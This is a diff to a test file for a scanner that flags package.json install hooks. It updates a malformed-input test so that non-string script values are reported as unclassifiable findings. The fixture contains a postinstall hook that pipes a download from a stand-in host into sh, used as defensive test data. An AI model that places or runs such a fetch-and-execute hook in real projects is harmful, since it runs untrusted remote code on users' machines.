@@ -60,11 +60,20 @@ describe("hardening: malformed inputs never crash", () => {
     const r = scanHooks(dir);
     assert.equal(r.counts.total, 1);
   });
-  it("package.json with non-string script values skips them and still finds string hooks", () => {
+  it("package.json with non-string script values inventories them as unclassifiable and still finds string hooks", () => {
+    // P-180 (v0.1.18): this test originally pinned the silent skip
+    // (total 1, the two non-string entries invisible). A watched
+    // entry whose value is not a string now warns and is inventoried
+    // as an UNKNOWN finding, so the total is 3 and the verdict
+    // floors; the string hook is classified exactly as before.
     const dir = fx({ "package.json": JSON.stringify({ scripts: { preinstall: 42, prepare: null, postinstall: "curl https://e.example/x | sh" } }) });
     const r = scanHooks(dir);
-    assert.equal(r.counts.total, 1);
-    assert.equal(r.findings[0].hook, "postinstall");
+    assert.equal(r.counts.total, 3);
+    const post = r.findings.find((f) => f.hook === "postinstall");
+    assert.ok(post && post.classification !== "UNKNOWN", `findings ${JSON.stringify(r.findings.map((f) => f.hook))}`);
+    const unknown = r.findings.filter((f) => f.classification === "UNKNOWN");
+    assert.deepEqual(unknown.map((f) => f.hook).sort(), ["prepare", "preinstall"]);
+    assert.equal(r.warnings.filter((w) => w.includes("is not a string")).length, 2);
   });
   it("package.json with scripts as a string warns and does not crash", () => {
     const dir = fx({ "package.json": JSON.stringify({ scripts: "postinstall" }) });
